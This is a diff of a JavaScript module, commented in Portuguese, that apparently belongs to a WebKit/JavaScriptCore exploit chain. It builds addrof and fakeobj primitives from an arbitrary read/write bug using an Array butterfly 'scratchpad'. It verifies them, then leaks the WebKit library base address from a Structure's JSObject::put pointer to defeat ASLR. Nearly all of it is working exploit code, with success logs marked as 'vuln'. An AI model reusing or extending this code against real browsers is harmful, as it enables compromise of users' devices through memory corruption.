@@ -1,13 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO PARA VAZAMENTO DA BASE DO WEBKIT)
+// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO COM ESTRATÉGIA ROBUSTA E CORREÇÕES)
 // =======================================================================================
-// CONCLUSÃO DA ANÁLISE:
-// A exploração de UAF para corromper objetos JS não é confiável neste ambiente.
-// Este script foi limpo para fornecer apenas as primitivas que foram comprovadamente
-// funcionais:
-// 1. Obtenção de OOB via core_exploit.
-// 2. Construção de primitivas addrof/fakeobj sintéticas a partir de L/E arbitrária.
-// 3. ATUALIZAÇÃO: Adicionada lógica para vazar o endereço base do WebKit usando as
-//    primitivas estáveis.
+// MUDANÇAS DA VERSÃO:
+// - Estratégia de `addrof` robustecida usando um Array como 'scratchpad' para garantir
+//   a existência de uma 'butterfly' com ponteiro válido.
+// - Teste das primitivas na Fase 3 melhorado para evitar falsos-positivos.
+// - Correção do `TypeError` ao acessar o offset da função na Fase 4.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,7 +14,8 @@ import {
     arb_read as core_arb_read,
     arb_write as core_arb_write
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+// Importação corrigida para incluir WEBKIT_LIBRARY_INFO
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";
 
@@ -30,7 +28,7 @@ function getSafeOffset(baseObject, path, defaultValue = 0) { let current = baseO
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} (com Vazamento de Base WebKit) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} (Estratégia Robusta v2) ---`, "test");
     let final_result = {
         success: false,
         message: "Teste não concluído.",
@@ -51,70 +49,84 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true });
         logS3("Primitiva de L/E do Core operacional.", "good");
 
-        // --- FASE 2: CONSTRUIR PRIMITIVAS SINTÉTICAS ESTÁVEIS ---
-        logS3("--- FASE 2: Construindo Primitivas Sintéticas (addrof/fakeobj) ---", "subtest");
+        // --- FASE 2: CONSTRUINDO PRIMITIVAS SINTÉTICAS (ESTRATÉGIA DE ARRAY) ---
+        logS3("--- FASE 2: Construindo Primitivas Sintéticas (Estratégia de Array) ---", "subtest");
         
         const bootstrap_addrof = (obj) => { const ca=[13.37], va=[{}]; va[0]=obj; return doubleToInt64(ca[0]); };
 
-        const scratchpad = { slot: null };
-        const scratchpad_addr = bootstrap_addrof(scratchpad);
+        // Usar um Array para garantir uma butterfly. O elemento no índice 1 será nosso slot.
+        const scratchpad_array = [13.37, null];
+        const scratchpad_addr = bootstrap_addrof(scratchpad_array);
 
         if(!isAdvancedInt64Object(scratchpad_addr) || scratchpad_addr.equals(AdvancedInt64.Zero)) {
-             throw new Error("Falha no bootstrap: addrof inicial não retornou um endereço válido.");
+             throw new Error("Falha no bootstrap: addrof inicial não retornou um endereço válido para o array.");
         }
 
         const butterfly_addr = await core_arb_read(scratchpad_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET), 8);
-        const slot_addr = butterfly_addr; 
+        // O slot está no índice 1 do array (8 bytes após o início da butterfly)
+        const slot_addr = butterfly_addr.add(8);
         
-        logS3(`'Scratchpad' criado em ${scratchpad_addr.toString(true)}`, 'debug');
-        logS3(`Endereço do slot: ${slot_addr.toString(true)}`, 'debug');
+        logS3(`'Scratchpad Array' criado em ${scratchpad_addr.toString(true)}`, 'debug');
+        logS3(`Endereço da Butterfly do Array: ${butterfly_addr.toString(true)}`, 'debug');
+        logS3(`Endereço do slot (índice 1): ${slot_addr.toString(true)}`, 'debug');
+        
+        if (butterfly_addr.equals(AdvancedInt64.Zero)) {
+            throw new Error("A Butterfly do Array é NULA. A estratégia de `addrof` falhou.");
+        }
 
         const addrof = async (obj) => {
-            scratchpad.slot = obj;
+            scratchpad_array[1] = obj;
             return await core_arb_read(slot_addr, 8);
         };
 
         const fakeobj = async (addr) => {
             await core_arb_write(slot_addr, addr, 8);
-            return scratchpad.slot;
+            return scratchpad_array[1];
         };
-        logS3("Primitivas sintéticas 'addrof' e 'fakeobj' prontas.", "good");
+        logS3("Primitivas sintéticas 'addrof' e 'fakeobj' (baseadas em Array) prontas.", "good");
 
-        // --- FASE 3: TESTAR PRIMITIVAS SINTÉTICAS ---
-        logS3("--- FASE 3: Testando Primitivas Sintéticas ---", "subtest");
-        const test_obj = { a: 0xDEADBEEF, b: 0xCAFEBABE };
-        const test_addr = await addrof(test_obj);
-        const faked_obj = await fakeobj(test_addr);
+        // --- FASE 3: TESTANDO PRIMITIVAS SINTÉTICAS (TESTE ROBUSTO) ---
+        logS3("--- FASE 3: Testando Primitivas Sintéticas (Teste Robusto) ---", "subtest");
+        const test_obj_A = { type: 'A', val: 0xAAAAAAAA };
+        const test_obj_B = { type: 'B', val: 0xBBBBBBBB };
 
-        if (faked_obj.a === test_obj.a && faked_obj.b === test_obj.b) {
-            logS3("++++++++++ SUCESSO! Primitivas sintéticas são funcionais. ++++++++++", "vuln");
+        const addr_A = await addrof(test_obj_A);
+        const faked_A = await fakeobj(addr_A);
+
+        const addr_B = await addrof(test_obj_B);
+        const faked_B = await fakeobj(addr_B);
+        
+        logS3(`addrof(obj_A) => ${addr_A.toString(true)}`, "debug");
+        logS3(`addrof(obj_B) => ${addr_B.toString(true)}`, "debug");
+        logS3(`fakeobj(addr_A) => tipo: ${faked_A.type}, val: ${toHex(faked_A.val)}`, "debug");
+        logS3(`fakeobj(addr_B) => tipo: ${faked_B.type}, val: ${toHex(faked_B.val)}`, "debug");
+
+        if (faked_A.val === test_obj_A.val && faked_B.val === test_obj_B.val && !addr_A.equals(addr_B)) {
+            logS3("++++++++++ SUCESSO! Primitivas sintéticas são funcionais (verificação robusta passou). ++++++++++", "vuln");
             final_result.primitives_functional = true;
         } else {
-            throw new Error("Falha na verificação das primitivas sintéticas. O endereço do slot pode estar incorreto.");
+            throw new Error("Falha na verificação robusta das primitivas sintéticas.");
         }
 
-        // --- NOVA FASE 4: VAZANDO ENDEREÇO BASE DO WEBKIT ---
+        // --- FASE 4: VAZANDO ENDEREÇO BASE DO WEBKIT ---
         logS3("--- FASE 4: Vazando Endereço Base do WebKit ---", "subtest");
 
-        // 4.1. Criar objeto alvo e obter seu endereço
         const leak_target_obj = { marker: 0x41424344 };
         const leak_target_addr = await addrof(leak_target_obj);
         logS3(`Endereço do objeto alvo para vazamento: ${leak_target_addr.toString(true)}`, "info");
 
-        // 4.2. Ler o ponteiro para a Estrutura (Structure)
         const structure_addr = await core_arb_read(leak_target_addr.add(LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET), 8);
         logS3(`Endereço da Estrutura lido em offset 0x${LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET.toString(16)}: ${structure_addr.toString(true)}`, "info");
 
-        // 4.3. Ler o ponteiro da função virtual (JSObject::put) a partir da Estrutura
         const put_func_ptr = await core_arb_read(structure_addr.add(LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET), 8);
         logS3(`Ponteiro de função (JSObject::put) lido em offset 0x${LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET.toString(16)}: ${put_func_ptr.toString(true)}`, "leak");
-
-        // 4.4. Calcular o endereço base do WebKit
-        const put_func_offset_str = JSC_OFFSETS.FUNCTION_OFFSETS['JSC::JSObject::put'];
+        
+        // Caminho corrigido para acessar o offset da função
+        const put_func_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS['JSC::JSObject::put'];
         const put_func_library_offset = new AdvancedInt64(put_func_offset_str);
         const webkit_base_addr = put_func_ptr.sub(put_func_library_offset);
 
-        logS3(`Offset de JSC::JSObject::put na biblioteca: 0x${put_func_library_offset.low().toString(16)}`, "info");
+        logS3(`Offset de JSC::JSObject::put na biblioteca: ${put_func_offset_str}`, "info");
         logS3(`++++++++++ SUCESSO! Endereço base do WebKit calculado: ${webkit_base_addr.toString(true)} ++++++++++`, "vuln");
         
         final_result.success = true;
